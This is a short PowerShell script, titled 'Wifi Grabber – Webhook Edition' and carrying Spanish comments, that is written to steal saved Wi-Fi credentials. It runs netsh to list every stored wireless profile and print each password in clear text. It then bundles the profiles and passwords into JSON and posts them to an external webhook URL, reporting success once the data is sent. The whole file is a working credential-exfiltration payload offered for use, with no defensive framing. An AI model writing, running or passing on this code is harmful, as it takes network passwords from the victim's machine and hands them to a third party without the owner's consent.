<#
    Title: Wifi Grabber – Webhook Edition
    Author: I am Jakoby (modificado)
    Description: Extrae perfiles de Wi-Fi y envía la tabla resultante a un webhook HTTP.
#>

# 1) Extraer todos los perfiles y sus contraseñas
$profiles = netsh wlan show profiles |
    Select-String ":\s+(.+)$" |
    ForEach-Object {
        $name = $_.Matches[0].Groups[1].Value.Trim()
        # Para cada perfil, obtener su clave en claro
        $details = netsh wlan show profile name="$name" key=clear
        $keyLine = $details | Select-String "Key Content\s+:\s+(.+)$"
        $pass = if ($keyLine) { $keyLine.Matches[0].Groups[1].Value.Trim() } else { "" }
        [PSCustomObject]@{
            Profile  = $name
            Password = $pass
        }
    }

# Formatear la salida como JSON (más compacto y fácil de procesar)
$payload = $profiles | ConvertTo-Json

# 2) Enviar al webhook
$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'
try {
    Invoke-RestMethod -Uri $webhook `
                      -Method Post `
                      -ContentType 'application/json' `
                      -Body $payload
    Write-Host "✅ Datos enviados a webhook."
}
catch {
    Write-Error "❌ Error al enviar a webhook: $_"
}

# 3) (Opcional) Limpieza de artefactos temporales o logs internos si fuese necesario
# Remove-Variable profiles, payload, webhook
